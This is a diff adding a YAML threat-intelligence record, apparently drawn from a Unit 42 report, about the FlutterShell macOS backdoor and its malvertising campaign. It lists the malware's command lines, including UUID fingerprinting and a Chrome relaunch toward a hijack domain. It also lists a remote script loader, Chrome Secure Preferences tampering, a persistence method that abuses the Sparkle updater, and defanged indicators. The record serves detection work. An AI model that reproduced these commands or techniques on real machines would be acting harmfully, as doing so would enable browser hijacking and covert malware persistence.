@@ -1,0 +1,138 @@
+title: 'Operation FlutterBridge: macOS Malvertising Campaign Delivering FlutterShell
+  Backdoor'
+description: FlutterShell is a macOS backdoor distributed through malvertising campaigns
+  by the CL-CRI-1089 cluster, using Flutter-based applications masquerading as legitimate
+  software to hijack browsers and execute arbitrary shell commands via a JavaScript-to-native
+  bridge. The campaign is linked to Windows adware strains RecipeLister and Calendaromatic
+  and its predecessor JSCoreRunner.
+attribution: CL-CRI-1089
+malware_families:
+- FlutterShell
+- JSCoreRunner
+- FileRipple
+- RecipeLister
+- Calendaromatic
+- Podcasts Lounge
+- PDF-Brain
+- PDF-Ninja
+cves: []
+ttps:
+  processes:
+  - ioreg
+  - sed
+  - killall
+  - Google Chrome
+  - open
+  - podcasts_lounge
+  - sh
+  command_lines:
+  - ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID | sed 's/.*"IOPlatformUUID"
+    = "//; s/"//g'
+  - killall "Google Chrome"
+  - Google Chrome "hxxps[:]//sinterfumesco[.]com/search?utn=[Tracking Data]=&q=starttt"
+    --restore-last-session --hide-crash-restore-bubble --noerrdialogs --disable-session-crashed-bubble
+  - dart:io exit()
+  - /bin/sh -c ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID | sed 's/.*"IOPlatformUUID"
+    = "//; s/"//g'
+  - /bin/sh -c "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" "https://sinterfumesco[.]com/search?utn=[REDACTED]=&q=starttt"
+    --restore-last-session --hide-crash-restore-bubble --noerrdialogs --disable-session-crashed-bubble
+  powershell: []
+  scripts:
+  - 'function loadConfig() {
+
+    console.log(''Loading config.js...'');
+
+    // Create and append script element
+
+    const script = document.createElement(''script'');
+
+    script.src = ''/getUpdateThanksConfig'';
+
+    script.onload = function() {
+
+    console.log(''configAbout.js loaded successfully'');
+
+    if (btn) {
+
+    btn.textContent = ''ConfigUpdate-Thanks.js Loaded'';
+
+    }}
+
+    script.onerror = function() {
+
+    console.error(''Failed to load configUpdate-Thanks.js'');
+
+    if (btn) {
+
+    btn.disabled = false;
+
+    btn.textContent = ''Load ConfigUpdate-Thanks.js (Retry)'';
+
+    }}
+
+    document.body.appendChild(script);
+
+    }
+
+    loadConfig();'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - FlutterShell -> atsheisdomestic[.]org
+  - FlutterShell -> etoftheappyrince[.]org
+  - FlutterShell -> healightejustb[.]org
+  - FlutterShell -> sinterfumesco[.]com
+  - FlutterShell -> atsheisdomestic[.]org/api/update-delay
+  - FlutterShell -> atsheisdomestic[.]org/update-thanks.html
+  - FlutterShell -> etoftheappyrince[.]org/update-delay
+  - FlutterShell -> healightejustb[.]org/checkupdateTO.js
+  - podcasts_lounge -> atsheisdomestic[.]org
+  - podcasts_lounge -> etoftheappyrince[.]org
+  - podcasts_lounge -> healightejustb[.]org
+  - podcasts_lounge -> sinterfumesco[.]com
+  file_activity:
+  - Google Chrome Secure Preferences file
+  - $HOME/Library/Caches/com.app.[appname]/org.sparkle-project.Sparkle/Installation/
+  - /Users/$USER$/Library/Application Support/Google/Chrome/Profile 1/Secure Preferences
+  - /Users/$USER$/Library/Application Support/Google/Chrome/Default/Secure Preferences
+  - /Users/$USERS$/Library/Application Support/Google/Chrome/Profile 2/Secure Preferences
+  persistence:
+  - FlutterShell uses the Sparkle software update framework to silently swap the malware
+    binary by programmatically executing the open command on a staged app bundle in
+    the Sparkle cache directory, bypassing user interaction
+  - Browser hijack via modification of Chrome Secure Preferences to change default
+    search provider to sinterfumesco[.]com
+  process_relations:
+  - podcasts_lounge -> sh
+iocs:
+  hashes:
+  - 021666417de8b9972c179783fe60d4c4ad2d93224e3a0f16137065c960b1b845
+  - 363923500ce942bf1a953e8a4e943fbf1fb1b5ed6e5d247964c345b3ad5bfc34
+  - 8421c902364980e3d762ec6dbbe6b0f40577c27bd79b48c57d098328b2533109
+  - 644fc49fa1006a2a2acace694e5fb83753164e2617051ece6d9dc9ea32329e70
+  - 9053e8ddaecca1f960c041c944ca8799fc71dc86a4b50d2639ee4e0d2cb82f47
+  - b60074d1ea2008a581f432f2dee5f84f78668d9dd8e66f75d03c42dabd89bdea
+  - 9425e8e39fa8a7212cdd07f0917cb3dfde38a90b87297de2c82a5850aff1e4de
+  - 30448686ec900d5213d74f08f0d2b7924c5336a29445b2a434aba8d8b19d7530
+  - 48047c34bbd57fe1e24bc538bc2ce9e0ac4c4eb48d3b0c195b414f0379dc0745
+  ip_addresses: []
+  domains:
+  - atsheisdomestic[.]org
+  - etoftheappyrince[.]org
+  - healightejustb[.]org
+  - sinterfumesco[.]com
+  - ads-parkpro[.]com
+  - adsparkpro[.]top
+  - adsparkpro[.]net
+  - softwe[.]art
+  urls:
+  - hxxps[:]//sinterfumesco[.]com/search?utn=[Tracking Data]=&q=starttt
+  - hxxps[:]//atsheisdomestic[.]org/update-thanks.html
+  - hxxps[:]//etoftheappyrince[.]org/update-delay
+  - hxxps[:]//healightejustb[.]org/checkupdateTO.js
+  - hxxps://sinterfumesco[.]com/search?utn=[REDACTED]=&q=starttt
+authors:
+- Unit 42
+reference: https://unit42.paloaltonetworks.com/flutterbridge-new-fluttershell-backdoor/
+date_of_publication: June 02, 2026
+file_creation_date: June 04, 2026
